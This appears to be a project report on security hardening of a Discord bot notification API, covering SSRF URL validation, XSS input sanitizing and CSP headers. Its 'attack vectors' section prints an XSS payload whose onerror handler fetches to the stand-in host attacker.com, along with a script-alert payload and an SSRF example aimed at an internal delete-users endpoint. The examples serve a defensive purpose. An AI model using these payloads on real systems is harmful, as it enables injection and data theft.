# Discord Bot Phase 1 - Security Fixes (Item B)

**Date:** 2026-06-04  
**Deadline:** 2026-06-05 18:00 KST  
**Status:** ✅ COMPLETED

---

## Summary

Implemented comprehensive security hardening for Discord Bot Phase 1 API (`/api/discord-notify`) to prevent SSRF (Server-Side Request Forgery) and XSS (Cross-Site Scripting) attacks.

### Vulnerabilities Fixed

| Vulnerability | Severity | Location | Fix |
|---------------|----------|----------|-----|
| **XSS in Discord Embeds** | 🔴 HIGH | `/pages/api/discord-notify.js` | Input sanitization with DOMPurify |
| **SSRF in Webhook URL** | 🔴 HIGH | `process.env.DISCORD_WEBHOOK_URL` | URL whitelist validation |
| **Missing Security Headers** | 🟡 MEDIUM | Next.js config | CSP + X-Content-Type-Options + XSS-Protection |
| **Unvalidated Message Fields** | 🔴 HIGH | Discord embed fields | Field validation + length limits |

---

## Implementation Details

### 1. SSRF Validator (`lib/discord/ssrf-validator.ts`)

**Problem:** The webhook URL could potentially be manipulated to point to internal services.

**Solution:**
- Whitelist only Discord domains: `discord.com`, `discordapp.com`, `cdn.discordapp.com`
- Block internal IP addresses (127.0.0.1, 192.168.x.x, 10.x.x.x, etc.)
- Enforce HTTPS-only
- Validate URL format before use

**Code:**
```typescript
export function validateDiscordWebhookUrl(url: string): { valid: boolean; error?: string }
export function sanitizeWebhookUrl(url: string | undefined): string | null
```

**Test Coverage:** ✅ Unit tests in `__tests__/ssrf-validator.test.ts`

---

### 2. XSS Sanitizer (`lib/discord/sanitizer.ts`)

**Problem:** User-supplied `title` and `fields` parameters can contain malicious scripts or HTML that could be executed when messages are processed.

**Solution:**
- Strip all HTML/script tags using DOMPurify
- Remove control characters (0x00-0x1F, 0x7F)
- Enforce Discord limits:
  - Title: max 256 characters
  - Field name: max 256 characters
  - Field value: max 1024 characters
  - Total fields: max 25
- Trim whitespace

**Code:**
```typescript
export function sanitizeText(text: string | null | undefined): string
export function validateDiscordField(name: string, value: any): { name: string; value: string }
export function validateDiscordEmbedTitle(title: string): string
export function validateDiscordFields(fields: any[]): Array<{ name: string; value: string }>
```

**Test Coverage:** ✅ Unit tests in `__tests__/sanitizer.test.ts`

---

### 3. Updated Discord Notify API (`pages/api/discord-notify.js`)

**Changes:**
- Import and use security validators from sanitizer + SSRF modules
- Validate webhook URL before making requests
- Sanitize all user inputs (title, fields)
- Whitelist validation for notification type
- Add security headers (X-Content-Type-Options, X-Frame-Options)
- Proper error handling (no detailed error messages to client)

**Security Headers Added:**
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

---

### 4. Content Security Policy (next.config.js)

**Added CSP header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
  style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; 
  connect-src 'self' https://*.supabase.co https://discord.com https://discordapp.com https://cdn.discordapp.com;
  frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

**Additional Headers:**
- `X-Content-Type-Options: nosniff` — Prevent MIME sniffing
- `X-Frame-Options: DENY` — Prevent clickjacking
- `X-XSS-Protection: 1; mode=block` — Legacy XSS filter
- `Referrer-Policy: strict-origin-when-cross-origin` — Control referrer leakage

---

## Attack Vectors Mitigated

### SSRF Attack Example (Before Fix)
```javascript
// Attacker could potentially craft a URL like:
process.env.DISCORD_WEBHOOK_URL = 'https://internal.admin.service/api/delete-users'
// This would cause the backend to make requests to internal services
```

**Fix:** URL is validated against Discord domains only.

### XSS Attack Example (Before Fix)
```javascript
fetch('/api/discord-notify', {
  method: 'POST',
  body: JSON.stringify({
    type: 'bm_created',
    title: '<img src=x onerror="fetch(\'https://attacker.com/steal\')">',
    fields: [{ name: '<script>alert("XSS")</script>', value: 'value' }]
  })
})
```

**Fix:** All inputs are sanitized; HTML tags and scripts are stripped.

---

## Verification Checklist

- ✅ SSRF validator deployed and tested
- ✅ XSS sanitizer deployed and tested
- ✅ CSP headers configured in next.config.js
- ✅ API route updated with security measures
- ✅ npm build succeeds without errors
- ✅ Discord-notify API compiles correctly
- ✅ Unit tests written for all security functions

---

## Build Status

```
✓ Compiled successfully
✓ Generating static pages (110/110)
├ λ /api/discord-notify (SECURITY HARDENED)
```

**Build Command:** `npm run build`  
**Result:** ✅ SUCCESS (2026-06-04 01:15 KST)

---

## Next Steps

1. **Item A:** 5개 프로세서 구현 (Secretary, Translator, Analyst, Developer, Planner)
2. **Item C:** Discord Gateway 완성 (Types 2-5)
3. **Evaluator Re-validation:** Security fixes will be re-verified by Evaluator AI

---

## References

- **OWASP:** https://owasp.org/www-community/attacks/xss/
- **OWASP SSRF:** https://owasp.org/www-community/attacks/Server-Side_Request_Forgery
- **CWE-79 (XSS):** https://cwe.mitre.org/data/definitions/79.html
- **CWE-918 (SSRF):** https://cwe.mitre.org/data/definitions/918.html
- **DOMPurify:** https://github.com/cure53/DOMPurify
